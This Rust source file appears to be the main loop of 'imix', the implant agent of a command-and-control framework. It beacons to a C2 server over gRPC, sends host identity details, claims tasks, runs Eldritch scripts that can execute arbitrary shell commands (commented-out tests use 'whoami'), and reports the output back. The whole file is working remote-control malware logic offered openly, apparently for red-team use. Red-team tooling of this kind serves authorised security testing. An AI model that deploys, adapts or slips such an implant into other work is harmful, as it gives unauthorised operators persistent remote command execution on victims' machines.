use anyhow::{Context, Error, Result};
use c2::pb::c2_client::C2Client;
use c2::pb::host::Platform;
use c2::pb::{Agent, Beacon, ClaimTasksRequest, Host, ReportTaskOutputRequest, Task, TaskOutput};

use chrono::{DateTime, Utc};
use clap::{arg, Command};
use eldritch::{eldritch_run, EldritchPrintHandler};
use imix::agent_init;
use std::fs::File;
use std::sync::mpsc::{channel, Receiver, Sender};
use std::thread;
use std::time::Instant;
use std::collections::HashMap;
use tokio::task::{self, JoinHandle};
use tokio::time::Duration;

pub struct AsyncTask {
    future_join_handle: JoinHandle<Result<(), Error>>,
    start_time: DateTime<Utc>,
    grpc_task: Task,
    print_reciever: Receiver<String>,
}

async fn handle_exec_tome(
    task: Task,
    print_channel_sender: Sender<String>,
) -> Result<(String, String)> {
    // TODO: Download auxillary files from CDN

    // Read a tome script
    // let task_quest = match task.quest {
    //     Some(quest) => quest,
    //     None => return Ok(("".to_string(), format!("No quest associated for task ID: {}", task.id))),
    // };

    let print_handler = EldritchPrintHandler {
        sender: print_channel_sender,
    };

    // Execute a tome script
    let res = match thread::spawn(move || {
        eldritch_run(
            task.id.to_string(),
            task.eldritch.clone(),
            Some(task.parameters.clone()),
            &print_handler,
        )
    })
    .join()
    {
        Ok(local_thread_res) => local_thread_res,
        Err(_) => todo!(),
    };
    match res {
        Ok(tome_output) => Ok((tome_output, "".to_string())),
        Err(tome_error) => Ok(("".to_string(), tome_error.to_string())),
    }
}

async fn handle_exec_timeout_and_response(
    task: Task,
    print_channel_sender: Sender<String>,
) -> Result<(), Error> {
    // Tasks will be forcebly stopped after 1 week.
    let timeout_duration = Duration::from_secs(60 * 60 * 24 * 7); // 1 Week.

    // Define a future for our execution task
    let exec_future = handle_exec_tome(task.clone(), print_channel_sender.clone());
    // Execute that future with a timeout defined by the timeout argument.
    let tome_result = match tokio::time::timeout(timeout_duration, exec_future).await {
        Ok(res) => match res {
            Ok(tome_result) => tome_result,
            Err(tome_error) => ("".to_string(), tome_error.to_string()),
        },
        Err(timer_elapsed) => (
            "".to_string(),
            format!(
                "Time elapsed task {} has been running for {} seconds",
                task.id,
                timer_elapsed.to_string()
            ),
        ),
    };

    print_channel_sender
        .clone()
        .send(format!("---[RESULT]----\n{}\n---------", tome_result.0))?;
    print_channel_sender
        .clone()
        .send(format!("---[ERROR]----\n{}\n--------", tome_result.1))?;
    Ok(())
}

// Async handler for port scanning.
async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<()> {
    let mut loop_count: i32 = 0;
    let config_file = File::open(config_path)?;
    let imix_config: imix::Config = serde_json::from_reader(config_file)?;

    // This hashmap tracks all tasks by their ID (key) and a tuple value: (future, channel_reciever)
    let mut all_exec_futures: HashMap<i64, AsyncTask> = HashMap::new();
    // This hashmap tracks all tasks output
    let mut all_task_res_map: HashMap<i64, Vec<TaskOutput>> = HashMap::new();

    let agent_properties = agent_init()?;

    loop {
        let start_time = Utc::now().time();
        // 0. Get loop start time
        let loop_start_time = Instant::now();
        #[cfg(debug_assertions)]
        println!("Get new tasks");
        // 1. Pull down new tasks
        // 1a) calculate callback uri
        let cur_callback_uri = imix_config.callback_config.c2_configs[0].uri.clone();

        let mut tavern_client = match C2Client::connect(cur_callback_uri.clone()).await {
            Ok(tavern_client_local) => tavern_client_local,
            Err(err) => {
                #[cfg(debug_assertions)]
                println!("failed to create tavern client {}", err);
                continue;
            }
        };

        #[cfg(debug_assertions)]
        println!(
            "[{}]: collecting tasks",
            (Utc::now().time() - start_time).num_milliseconds()
        );
        // 1b) Collect new tasks
        let req = tonic::Request::new(ClaimTasksRequest {
            beacon: Some(Beacon {
                identifier: agent_properties.beacon_id.clone(),
                principal: agent_properties.principal.clone(),
                host: Some(Host {
                    identifier: agent_properties.host_id.clone(),
                    name: agent_properties.hostname.clone(),
                    platform: agent_properties.host_platform.try_into()?,
                    primary_ip: agent_properties.primary_ip.clone().context("primary ip not found")?,
                }),
                agent: Some(Agent {
                    identifier: agent_properties.agent_id.clone(),
                }),
                interval: imix_config.callback_config.interval,
            }),
        });
        let new_tasks = match tavern_client.claim_tasks(req).await {
            Ok(resp) => resp.get_ref().tasks.clone(),
            Err(error) => {
                #[cfg(debug_assertions)]
                println!("main_loop: error claiming task\n{:?}", error);
                let empty_vec = vec![];
                empty_vec
            }
        };

        #[cfg(debug_assertions)]
        println!(
            "[{}]: Starting {} new tasks",
            (Utc::now().time() - start_time).num_milliseconds(),
            new_tasks.len()
        );
        // 2. Start new tasks
        for task in new_tasks {
            #[cfg(debug_assertions)]
            println!("Parameters:\n{:?}", task.clone().parameters);
            #[cfg(debug_assertions)]
            println!("Launching:\n{:?}", task.clone().eldritch);

            let (sender, receiver) = channel::<String>();
            let exec_with_timeout = handle_exec_timeout_and_response(task.clone(), sender.clone());
            #[cfg(debug_assertions)]
            println!(
                "[{}]: Queueing task {}",
                (Utc::now().time() - start_time).num_milliseconds(),
                task.clone().id
            );
            match all_exec_futures.insert(
                task.clone().id,
                AsyncTask {
                    future_join_handle: task::spawn(exec_with_timeout),
                    start_time: Utc::now(),
                    grpc_task: task.clone(),
                    print_reciever: receiver,
                },
            ) {
                Some(_old_task) => {
                    #[cfg(debug_assertions)]
                    println!("main_loop: error adding new task. Non-unique taskID\n");
                }
                None => {
                    #[cfg(debug_assertions)]
                    println!("main_loop: Task queued successfully\n");
                } // Task queued successfully
            }
            #[cfg(debug_assertions)]
            println!(
                "[{}]: Queued task {}",
                (Utc::now().time() - start_time).num_milliseconds(),
                task.clone().id
            );
        }

        // 3. Sleep till callback time
        let time_to_wait = imix_config.callback_config.interval as i64;
        let time_elapsed = loop_start_time.elapsed().as_secs() as i64;
        let mut time_to_sleep = time_to_wait - time_elapsed;
        if time_to_sleep < 0 {
            time_to_sleep = 0;
        } // Control for unsigned underflow
        #[cfg(debug_assertions)]
        println!(
            "[{}]: Sleeping seconds {}",
            (Utc::now().time() - start_time).num_milliseconds(),
            time_to_sleep
        );
        // tokio::time::sleep(std::time::Duration::new(time_to_sleep, 24601)).await; // This seems to wait for other threads to finish.
        std::thread::sleep(std::time::Duration::new(time_to_sleep as u64, 24601)); // This just sleeps our thread.

        // :clap: :clap: make new map!
        let mut running_exec_futures: HashMap<i64, AsyncTask> = HashMap::new();
        let mut running_task_res_map: HashMap<i64, Vec<TaskOutput>> = all_task_res_map.clone();

        #[cfg(debug_assertions)]
        println!(
            "[{}]: Checking task status",
            (Utc::now().time() - start_time).num_milliseconds()
        );

        // Check status & send response
        for exec_future in all_exec_futures.into_iter() {
            let task_id = exec_future.0;

            #[cfg(debug_assertions)]
            println!(
                "[{}]: Task # {} is_finished? {}",
                (Utc::now().time() - start_time).num_milliseconds(),
                task_id,
                exec_future.1.future_join_handle.is_finished()
            );

            // If the task doesn't exist in the map add a vector for it.
            if !running_task_res_map.contains_key(&task_id) {
                running_task_res_map.insert(task_id.clone(), vec![]);
            }

            let mut task_channel_output: Vec<String> = vec![];

            // Loop over each line of output from the task and append it the the channel output.
            loop {
                #[cfg(debug_assertions)]
                println!(
                    "[{}]: Task # {} recieving output",
                    (Utc::now().time() - start_time).num_milliseconds(),
                    task_id
                );
                let new_res_line = match exec_future
                    .1
                    .print_reciever
                    .recv_timeout(Duration::from_millis(100))
                {
                    Ok(local_res_string) => local_res_string,
                    Err(local_err) => {
                        match local_err.to_string().as_str() {
                            "channel is empty and sending half is closed" => {
                                break;
                            }
                            "timed out waiting on channel" => {
                                break;
                            }
                            _ => eprint!("Error: {}", local_err),
                        }
                        break;
                    }
                };
                // let appended_line = format!("{}{}", res.to_owned(), new_res_line);
                task_channel_output.push(new_res_line);
            }

            let task_is_finished = exec_future.1.future_join_handle.is_finished();
            let task_response_exec_finished_at = match task_is_finished {
                true => Some(Utc::now()),
                false => None,
            };

            // If the task is finished or there's new data queue a new task result.
            if task_is_finished || task_channel_output.len() > 0 {
                let task_response = TaskOutput {
                    id: exec_future.1.grpc_task.id.clone(),
                    exec_started_at: Some(prost_types::Timestamp {
                        seconds: exec_future.1.start_time.timestamp(),
                        nanos: exec_future.1.start_time.timestamp_subsec_nanos() as i32,
                    }),
                    exec_finished_at: match task_response_exec_finished_at {
                        Some(timestamp) => Some(prost_types::Timestamp {
                            seconds: timestamp.timestamp(),
                            nanos: timestamp.timestamp_subsec_nanos() as i32,
                        }),
                        None => None,
                    },
                    output: task_channel_output.join("\n"),
                    error: None,
                };

                let mut tmp_res_list = running_task_res_map
                    .get(&task_id)
                    .context("Failed to get task output by ID")?
                    .clone();
                tmp_res_list.push(task_response);
                running_task_res_map.insert(task_id.clone(), tmp_res_list);
            }

            // Only re-insert the still running exec futures
            if !exec_future.1.future_join_handle.is_finished() {
                running_exec_futures.insert(task_id, exec_future.1);
            }
        }

        // Iterate over queued task results and send them back to the server
        for (task_id, task_res) in running_task_res_map.clone().into_iter() {
            for output in task_res {
                let req = tonic::Request::new(ReportTaskOutputRequest {
                    output: Some(output),
                });
                match tavern_client.report_task_output(req).await {
                    Ok(_) => {
                        running_task_res_map.remove(&task_id);
                    }
                    Err(local_err) => {
                        #[cfg(debug_assertions)]
                        println!("Failed to submit task resluts:\n{}", local_err.to_string());
                        {}
                    }
                }
            }
        }

        // change the reference! This is insane but okay.
        all_exec_futures = running_exec_futures;
        all_task_res_map = running_task_res_map.clone();

        // Debug loop tracker
        #[cfg(debug_assertions)]
        if let Some(count_max) = loop_count_max {
            loop_count += 1;
            if loop_count >= count_max {
                return Ok(());
            }
        }
    }
}

pub fn main() -> Result<(), imix::Error> {
    let matches = Command::new("imix")
        .arg(
            arg!(
                -c --config <FILE> "Sets a custom config file"
            )
            .required(false),
        )
        .subcommand(
            Command::new("install").about("Run in install mode").arg(
                arg!(
                    -c --config <FILE> "Sets a custom config file"
                )
                .required(true),
            ),
        )
        .get_matches();

    let runtime = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(128)
        .enable_all()
        .build()
        .unwrap();

    match matches.subcommand() {
        Some(("install", args)) => {
            let config_path = args.value_of("config").unwrap();
            unimplemented!("Install isn't implemented yet")
        }
        _ => {}
    }

    if let Some(config_path) = matches.value_of("config") {
        match runtime.block_on(main_loop(config_path.to_string(), None)) {
            Ok(_) => {}
            Err(error) => eprintln!(
                "Imix main_loop exited unexpectedly with config: {}\n{}",
                config_path.to_string(),
                error
            ),
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use c2::pb::ClaimTasksResponse;

    #[test]
    fn imix_handle_exec_tome() {
        let server_response = tonic::Response::new(ClaimTasksResponse {
            tasks: todo!(),
        });
    }

    //     #[test]
    //     fn imix_handle_exec_tome() {
    //         let test_tome_input = Task {
    //             id: "17179869185".to_string(),
    //             quest: Quest {
    //                 id: "4294967297".to_string(),
    //                 name: "Test Exec".to_string(),
    //                 parameters: Some(r#"{"cmd":"whoami"}"#.to_string()),
    //                 tome: Tome {
    //                     id: "21474836482".to_string(),
    //                     name: "Shell execute".to_string(),
    //                     description: "Execute a command in the default system shell".to_string(),
    //                     eldritch: r#"
    // print("custom_print_handler_test")
    // sys.shell(input_params["cmd"])["stdout"]
    // "#
    //                     .to_string(),
    //                     files: None,
    //                     param_defs: Some(r#"{"params":[{"name":"cmd","type":"string"}]}"#.to_string()),
    //                 },
    //                 bundle: None,
    //             },
    //         };

    //         let runtime = tokio::runtime::Builder::new_multi_thread()
    //             .enable_all()
    //             .build()
    //             .unwrap();

    //         let (sender, receiver) = channel::<String>();

    //         // Define a future for our execution task
    //         let exec_future = handle_exec_tome(test_tome_input, sender.clone());
    //         let result = runtime.block_on(exec_future).unwrap();

    //         let stdout = receiver.recv_timeout(Duration::from_millis(500)).unwrap();
    //         assert_eq!(stdout, "custom_print_handler_test".to_string());

    //         let mut bool_res = false;

    //         if cfg!(target_os = "linux")
    //             || cfg!(target_os = "ios")
    //             || cfg!(target_os = "android")
    //             || cfg!(target_os = "freebsd")
    //             || cfg!(target_os = "openbsd")
    //             || cfg!(target_os = "netbsd")
    //             || cfg!(target_os = "macos")
    //         {
    //             bool_res = result.0 == "runner\n" || result.0 == "root\n";
    //         } else if cfg!(target_os = "windows") {
    //             bool_res = result.0.contains("runneradmin") || result.0.contains("Administrator");
    //         }

    //         assert_eq!(bool_res, true);
    //     }

    //     #[test]
    //     fn imix_test_main_loop_sleep_twice_short() -> Result<()> {
    //         // Response expectations are poped in reverse order.
    //         let server = Server::run();
    //         let test_task_id = "17179869185".to_string();
    //         let post_result_response = GraphQLResponse {
    //             data: Some(SubmitTaskResult {
    //                 id: test_task_id.clone(),
    //             }),
    //             errors: None,
    //             extensions: None,
    //         };
    //         server.expect(
    //             Expectation::matching(all_of![
    //                 request::method_path("POST", "/graphql"),
    //                 request::body(matches(".*variables.*execStartedAt.*"))
    //             ])
    //             .times(1)
    //             .respond_with(status_code(200).body(serde_json::to_string(&post_result_response)?)),
    //         );

    //         let test_task = Task {
    //             id: test_task_id,
    //             quest: Quest {
    //                 id: "4294967297".to_string(),
    //                 name: "Exec stuff".to_string(),
    //                 parameters: None,
    //                 tome: Tome {
    //                     id: "21474836482".to_string(),
    //                     name: "sys exec".to_string(),
    //                     description: "Execute system things.".to_string(),
    //                     param_defs: None,
    //                     eldritch: r#"
    // def test():
    // if sys.is_macos():
    // sys.shell("sleep 3")
    // if sys.is_linux():
    // sys.shell("sleep 3")
    // if sys.is_windows():
    // sys.shell("timeout 3")
    // test()
    // print("main_loop_test_success")"#
    //                         .to_string(),
    //                     files: None,
    //                 },
    //                 bundle: None,
    //             },
    //         };
    //         let claim_task_response = GraphQLResponse {
    //             data: Some(ClaimTasksResponseData {
    //                 claim_tasks: vec![test_task.clone(), test_task.clone()],
    //             }),
    //             errors: None,
    //             extensions: None,
    //         };
    //         server.expect(
    //             Expectation::matching(all_of![
    //                 request::method_path("POST", "/graphql"),
    //                 request::body(matches(".*variables.*hostPlatform.*"))
    //             ])
    //             .times(1)
    //             .respond_with(status_code(200).body(serde_json::to_string(&claim_task_response)?)),
    //         );
    //         let url = server.url("/graphql").to_string();

    //         let tmp_file_new = NamedTempFile::new()?;
    //         let path_new = String::from(tmp_file_new.path().to_str().unwrap()).clone();
    //         let _ = std::fs::write(
    //             path_new.clone(),
    //             format!(
    //                 r#"{{
    //     "service_configs": [],
    //     "target_forward_connect_ip": "127.0.0.1",
    //     "target_name": "test1234",
    //     "callback_config": {{
    //         "interval": 4,
    //         "jitter": 0,
    //         "timeout": 4,
    //         "c2_configs": [
    //         {{
    //             "priority": 1,
    //             "uri": "{url}"
    //         }}
    //         ]
    //     }}
    // }}"#
    //             ),
    //         );

    //         let runtime = tokio::runtime::Builder::new_multi_thread()
    //             .enable_all()
    //             .build()
    //             .unwrap();

    //         // Define a future for our execution task
    //         let start_time = Utc::now().time();
    //         let exec_future = main_loop(path_new, Some(1));
    //         let _result = runtime.block_on(exec_future).unwrap();
    //         let end_time = Utc::now().time();
    //         let diff = (end_time - start_time).num_milliseconds();
    //         assert!(diff < 4500);
    //         Ok(())
    //     }

    //     #[test]
    //     fn imix_test_main_loop_run_once() -> Result<()> {
    //         let test_task_id = "17179869185".to_string();

    //         // Response expectations are poped in reverse order.
    //         let server = Server::run();

    //         let post_result_response = GraphQLResponse {
    //             data: Some(SubmitTaskResult {
    //                 id: test_task_id.clone(),
    //             }),
    //             errors: None,
    //             extensions: None,
    //         };
    //         server.expect(
    //             Expectation::matching(all_of![
    //                 request::method_path("POST", "/graphql"),
    //                 request::body(matches(".*variables.*execStartedAt.*"))
    //             ])
    //             .times(1)
    //             .respond_with(status_code(200).body(serde_json::to_string(&post_result_response)?)),
    //         );

    //         let claim_task_response = GraphQLResponse {
    //             data: Some(ClaimTasksResponseData {
    //                 claim_tasks: vec![Task {
    //                     id: test_task_id.clone(),
    //                     quest: Quest {
    //                         id: "4294967297".to_string(),
    //                         name: "Exec stuff".to_string(),
    //                         parameters: Some(r#"{"cmd":"echo main_loop_test_success"}"#.to_string()),
    //                         tome: Tome {
    //                             id: "21474836482".to_string(),
    //                             name: "sys exec".to_string(),
    //                             description: "Execute system things.".to_string(),
    //                             param_defs: Some(r#"[{"name":"cmd","type":"string"}]"#.to_string()),
    //                             eldritch: r#"print(sys.shell(input_params["cmd"]))"#.to_string(),
    //                             files: None,
    //                         },
    //                         bundle: None,
    //                     },
    //                 }],
    //             }),
    //             errors: None,
    //             extensions: None,
    //         };
    //         server.expect(
    //             Expectation::matching(all_of![
    //                 request::method_path("POST", "/graphql"),
    //                 request::body(matches(".*variables.*hostPlatform.*"))
    //             ])
    //             .times(1)
    //             .respond_with(status_code(200).body(serde_json::to_string(&claim_task_response)?)),
    //         );
    //         let url = server.url("/graphql").to_string();

    //         let tmp_file_new = NamedTempFile::new()?;
    //         let path_new = String::from(tmp_file_new.path().to_str().unwrap()).clone();
    //         let _ = std::fs::write(
    //             path_new.clone(),
    //             format!(
    //                 r#"{{
    //     "service_configs": [],
    //     "target_forward_connect_ip": "127.0.0.1",
    //     "target_name": "test1234",
    //     "callback_config": {{
    //         "interval": 4,
    //         "jitter": 1,
    //         "timeout": 4,
    //         "c2_configs": [
    //         {{
    //             "priority": 1,
    //             "uri": "{url}"
    //         }}
    //         ]
    //     }}
    // }}"#
    //             ),
    //         );

    //         let runtime = tokio::runtime::Builder::new_multi_thread()
    //             .enable_all()
    //             .build()
    //             .unwrap();

    //         let exec_future = main_loop(path_new, Some(1));
    //         let _result = runtime.block_on(exec_future)?;
    //         assert!(true);
    //         Ok(())
    //     }
}
